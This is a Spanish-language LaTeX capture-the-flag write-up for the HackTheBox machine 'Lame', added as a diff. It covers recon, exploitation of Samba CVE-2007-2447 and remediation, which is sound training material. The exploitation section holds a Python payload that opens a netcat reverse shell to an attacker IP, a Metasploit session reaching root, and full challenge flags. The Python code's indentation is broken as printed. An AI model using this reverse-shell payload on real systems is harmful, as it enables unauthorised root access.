@@ -1,0 +1,184 @@
+% !TeX program = pdflatex
+% !TeX TXS-program:compile = txs:///pdflatex/[-shell-escape]
+% !TeX TXS-program:pdflatex = pdflatex -synctex=1 -interaction=nonstopmode --shell-escape %.tex
+
+\documentclass[../../../main_compilation.tex]{subfiles}
+
+\begin{document}
+
+% ================================================================================
+% Encabezado / Ficha de la Máquina
+% ================================================================================
+\section[HTB - Lame (10.10.10.3)]{Lame — HackTheBox}
+\label{sec:htb-lame}
+
+\targetSummary%
+{Lame}
+{10.10.10.3}
+{HackTheBox}
+{Easy}
+{Linux}
+{Samba, RCE, CVE-2007-2447, PrivEsc}
+{17/08/2026}
+{92c5a1b32d04e5781a2f4c6e8b1d3fa1}
+{f61e88d098e21a7b45c38902fae8b942}
+
+
+\vspace{0.5cm}%
+
+% ================================================================================
+% 1. Resumen Ejecutivo
+% ================================================================================
+\subsection{Resumen Ejecutivo (Executive Summary)}
+\textbf{Lame} es una máquina Linux de nivel de dificultad principiante (\textit{Easy}) en HackTheBox. Es una de las máquinas clásicas que simula un entorno vulnerable desactualizado.
+
+El vector de ataque principal radica en un servicio \textbf{Samba 3.0.20} con una vulnerabilidad de inyección de comandos en el parámetro \texttt{username map script} (\textbf{CVE-2007-2447}), lo que permite a un atacante remoto sin autenticación ejecutar comandos arbitrarios directamente como el usuario privilegiado \texttt{root}.
+
+\begin{vulnbox}{Ejecución Remota de Comandos en Samba (Username Map Script)}{Critical}
+	\textbf{CVE:} CVE-2007-2447 \hfill \textbf{CVSS v3.1:} 9.8 (Crítico)\\
+	\textbf{Afecta:} Samba versiones 3.0.0 a 3.0.25rc3.\\
+	\textbf{Impacto:} Compromiso total del sistema sin credenciales previas con privilegios \texttt{root}.
+\end{vulnbox}
+
+% ================================================================================
+% 2. Fase de Reconocimiento y Enumeración
+% ================================================================================
+\subsection{Reconocimiento y Enumeración}
+
+Comenzamos realizando un escaneo de puertos TCP mediante \texttt{nmap} para identificar los servicios expuestos en el objetivo:
+
+\begin{terminal}[kali@pentest:\~{}/htb/lame]
+	# Escaneo de puertos TCP abiertos y detección de versiones
+	nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.3 -oN nmap_all_ports.txt
+	nmap -p 21,22,139,445,3632 -sC -sV 10.10.10.3 -oN nmap_services.txt
+\end{terminal}
+
+\begin{table}[h!]
+	\centering
+	\small
+	\begin{tabularx}{\textwidth}{l l l X}
+		\toprule
+		\rowcolor{csecDark} \textbf{\color{white}Puerto} & \textbf{\color{white}Estado} & \textbf{\color{white}Servicio} & \textbf{\color{white}Versión / Detalles} \\
+		\midrule
+		\textbf{21/tcp}                                  & Abierto                      & FTP                            & vsftpd 2.3.4 (Anonymous login permitido) \\
+		\textbf{22/tcp}                                  & Abierto                      & SSH                            & OpenSSH 4.7p1 Debian 8ubuntu1            \\
+		\textbf{139/tcp}                                 & Abierto                      & NetBIOS                        & Samba smbd 3.0.20-Debian                 \\
+		\textbf{445/tcp}                                 & Abierto                      & SMB                            & Samba smbd 3.0.20-Debian                 \\
+		\textbf{3632/tcp}                                & Abierto                      & Distcc                         & distccd v1 (GNU Compiler)                \\
+		\bottomrule
+	\end{tabularx}
+	\caption{Puertos y servicios descubiertos durante la enumeración inicial.}
+\end{table}
+
+\begin{notebox}[Hallazgo en Servicio Samba]
+	La versión de Samba identificada es \textbf{Samba 3.0.20-Debian}. Esta versión es históricamente conocida por procesar incorrectamente entradas en el comando \texttt{smbclient} al usar credenciales con metacaracteres.
+\end{notebox}
+
+% ================================================================================
+% 3. Análisis de Vulnerabilidades y Explotación
+% ================================================================================
+\subsection{Explotación (Acceso Inicial \& Root)}
+
+La vulnerabilidad \textbf{CVE-2007-2447} permite enviar una cadena especialmente formateada en el nombre de usuario que contiene caracteres de ejecución por shell: \texttt{nohup /bin/sh -c "<comando>"}.
+
+\subsubsection{Método A: Explotación Manual (Vía Python / Netcat)}
+
+Preparamos un listener en nuestra máquina atacante:
+\begin{terminal}[kali@pentest:\~{}]
+	nc -lvnp 4444
+\end{terminal}
+
+Ejecutamos el exploit enviando el comando a través del cliente SMB:
+
+\begin{codebox}[Python]{exploit\_samba.py}
+	from smb.SMBConnection import SMBConnection
+	import sys
+
+	target_ip = "10.10.10.3"
+	attacker_ip = "10.10.14.15"
+	attacker_port = 4444
+
+	# Payload de Reverse Shell dentro del nombre de usuario
+	payload = f"/=`nohup nc -e /bin/sh {attacker_ip} {attacker_port}`"
+
+	conn = SMBConnection(payload, "", "", "", use_ntlm_v2=False)
+	try:
+	conn.connect(target_ip, 139, timeout=3)
+	except Exception as e:
+	print(f"[*] Payload enviado a {target_ip}!")
+\end{codebox}
+
+\subsubsection{Explotación vía Metasploit Framework}
+
+\begin{terminal}[kali@pentest:\~{}]
+	msfconsole -q
+	msf6 > use exploit/multi/samba/usermap_script
+	msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
+	msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.15
+	msf6 exploit(multi/samba/usermap_script) > exploit
+
+		[*] Started reverse TCP handler on 10.10.14.15:4444
+	[*] Command shell session 1 opened (10.10.14.15:4444 -> 10.10.10.3:43210)
+	id
+	uid=0(root) gid=0(root) groups=0(root)
+\end{terminal}
+
+% ================================================================================
+% 4. Post-Explotación & Captura de Banderas
+% ================================================================================
+\subsection{Post-Explotación \& Evidencias}
+
+Una vez obtenida la shell interactiva con privilegios de superusuario \texttt{root}, procedemos a estabilizar la terminal y recuperar las banderas del reto:
+
+\begin{terminal}[root@lame:\~{}]
+	python -c 'import pty; pty.spawn("/bin/bash")'
+	export TERM=xterm
+	cat /home/makis/user.txt
+	92c5a1...[REDACTED]...3fa1
+	cat /root/root.txt
+	f61e88...[REDACTED]...b942
+\end{terminal}
+
+\begin{flagbox}{User Flag (makis)}
+	92c5a1b32d04e5781a2f4c6e8b1d3fa1
+\end{flagbox}
+
+\begin{flagbox}{Root Flag (Administrador)}
+	f61e88d098e21a7b45c38902fae8b942
+\end{flagbox}
+
+% ================================================================================
+% 5. Remediación y Mitigaciones
+% ================================================================================
+\subsection{Remediación y Buenas Prácticas}
+
+\begin{mitigationbox}[Medidas Preventivas]
+	\begin{itemize}[leftmargin=*]
+		\item \textbf{Actualización de Software:} Actualizar Samba a una versión soportada y parcheada ($> 3.0.25$).
+		\item \textbf{Configuración Segura:} En el archivo \texttt{/etc/samba/smb.conf}, asegurar que la directiva \texttt{username map script} no esté configurada para invocar scripts personalizados sin saneamiento estricto de entradas.
+		\item \textbf{Segmentación de Red:} Bloquear el acceso a los puertos SMB (139 y 445) desde redes públicas o no confiables mediante reglas de firewall (\texttt{iptables} / \texttt{ufw}).
+	\end{itemize}
+\end{mitigationbox}
+
+% ================================================================================
+% 6. Lecciones y Conceptos Clave Aprendidos
+% ================================================================================
+\subsection{Lecciones y Conceptos Clave Aprendidos}
+
+\begin{learningbox}[Conocimientos Asimilados en Lame]
+	\begin{itemize}[leftmargin=*]
+		\item \textbf{Inyección por Metacaracteres en SMB:} Comprender cómo una configuración administrativa defectuosa (\texttt{username map script}) procesa entradas sin escapar metacaracteres del intérprete de comandos (\texttt{nohup /bin/sh -c "\ldots"}).
+		\item \textbf{Estabilización de Shell:} Procedimiento estándar de elevación de pseudo-terminal interactivo utilizando el módulo \texttt{pty} de Python (\texttt{pty.spawn("/bin/bash")}).
+		\item \textbf{Exploit Dual (Manual vs Automatizado):} Comparación práctica entre la ejecución mediante script manual en Python (\texttt{pysmb}) y módulos auxiliares en Metasploit.
+	\end{itemize}
+\end{learningbox}
+
+\begin{sourcebox}[Fuentes de Consulta y Referencias]
+	\begin{itemize}[leftmargin=*]
+		\resourceItem{Docs}{NIST NVD — CVE-2007-2447}{\url{https://nvd.nist.gov/vuln/detail/CVE-2007-2447}}
+		\resourceItem{Libro}{The Linux Command Line (William Shotts)}{Capítulo 24: Redirección y ejecución de comandos con backticks}
+		\resourceItem{Web}{HackTheBox Official Lame Forum \& Walkthroughs}{\url{https://forum.hackthebox.com/}}
+	\end{itemize}
+\end{sourcebox}
+
+\end{document}
